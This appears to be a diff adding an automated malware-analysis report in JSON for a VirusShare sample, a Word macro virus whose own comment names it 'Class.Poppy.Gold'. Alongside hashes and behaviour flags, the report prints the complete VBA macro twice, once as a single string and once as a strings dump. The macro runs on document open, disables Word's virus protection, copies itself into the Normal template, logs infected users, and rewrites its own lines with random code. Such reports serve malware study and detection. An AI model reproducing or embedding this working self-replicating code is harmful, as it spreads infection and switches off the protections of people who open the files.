@@ -1,0 +1,77 @@
+{
+    "docinfo": {
+        "attributes": [
+            "Attribute VB_Name = \"ThisDocument\"",
+            "Attribute VB_Creatable = False",
+            "Attribute VB_PredeclaredId = True",
+            "Attribute VB_Exposed = True"
+        ],
+        "behavior": {
+            "AutoClose": "Runs when the Word document is closed",
+            "AutoOpen": "Runs when the Word document is opened",
+            "Chr": "May attempt to obfuscate specific str",
+            "CodeModule": "May attempt to modify the VBA code",
+            "VBComponents": "May attempt to modify the VBA code",
+            "VBProject": "May attempt to modify the VBA code"
+        },
+        "macro": "VERSION 1.0 CLASS\nBEGIN\n  MultiUse = -1  'True\nEND\n\n\n\n\nSub AutoOpen()\n\nOn Error GoTo out\n\nOptions.VirusProtection = False\n\nOptions.SaveNormalPrompt = False\n\nad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines\n\nnt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines\n\nIf nt > 40 And ad > 0 Then GoTo out\n\nIf nt < 40 Then\n\n    Set host = NormalTemplate.VBProject.VBComponents.Item(1)\n\n    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name\n\n    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines (ad + 1), \"' I infected \" & Application.UserName & \" on: \" & Now\n\n    ActiveDocument.VBProject.VBComponents.Item(1).Export \"c:\\\" & Application.UserInitials\n\nEnd If\n\nIf ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)\n\nhost.CodeModule.AddFromFile (\"c:\\\" & Application.UserInitials)\n\nhost.CodeModule.deletelines 1, 4\n\nIf nt < 40 Then host.CodeModule.replaceline 1, \"Sub AutoClose()\"\n\nWith host.CodeModule\n\n    For x = 2 To 48 Step 2\n\n    .replaceline x, (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 200) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & \" = \" & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & Int(Rnd * 200) & \" + \" & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & Int(Rnd * 200)\n\n    Next x\n\nEnd With\n\nout:\n\nIf nt > 40 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName\n\nEnd Sub\n\n' Class.Poppy.Gold Infection Log\n' ------------------------------"
+    },
+    "filename": "VirusShare_e71263677730db2217c95cb7f52aa783",
+    "filesize": 1732,
+    "filetype": "ASCII text, with very long lines, with CRLF line terminators",
+    "hashes": {
+        "md5": "e71263677730db2217c95cb7f52aa783",
+        "sha1": "3585b619b6ff2eb0b033ad9ae7d1039bc77cf58e",
+        "sha256": "33cfcf6259ab7f192f78ae133387b5d2f716d93321273a2d4449be3edd2f9513"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "VERSION 1.0 CLASS",
+            "BEGIN",
+            "  MultiUse = -1  'True",
+            "Attribute VB_Name = \"ThisDocument\"",
+            "Attribute VB_Creatable = False",
+            "Attribute VB_PredeclaredId = True",
+            "Attribute VB_Exposed = True",
+            "Sub AutoOpen()",
+            "On Error GoTo out",
+            "Options.VirusProtection = False",
+            "Options.SaveNormalPrompt = False",
+            "ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines",
+            "nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines",
+            "If nt > 40 And ad > 0 Then GoTo out",
+            "If nt < 40 Then",
+            "    Set host = NormalTemplate.VBProject.VBComponents.Item(1)",
+            "    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name",
+            "    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines (ad + 1), \"' I infected \" & Application.UserName & \" on: \" & Now",
+            "    ActiveDocument.VBProject.VBComponents.Item(1).Export \"c:\\\" & Application.UserInitials",
+            "End If",
+            "If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)",
+            "host.CodeModule.AddFromFile (\"c:\\\" & Application.UserInitials)",
+            "host.CodeModule.deletelines 1, 4",
+            "If nt < 40 Then host.CodeModule.replaceline 1, \"Sub AutoClose()\"",
+            "With host.CodeModule",
+            "    For x = 2 To 48 Step 2",
+            "    .replaceline x, (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 200) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & \" = \" & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & Int(Rnd * 200) & \" + \" & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & Int(Rnd * 200)",
+            "    Next x",
+            "End With",
+            "out:",
+            "If nt > 40 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName",
+            "End Sub",
+            "' Class.Poppy.Gold Infection Log",
+            "' ------------------------------"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.306835",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
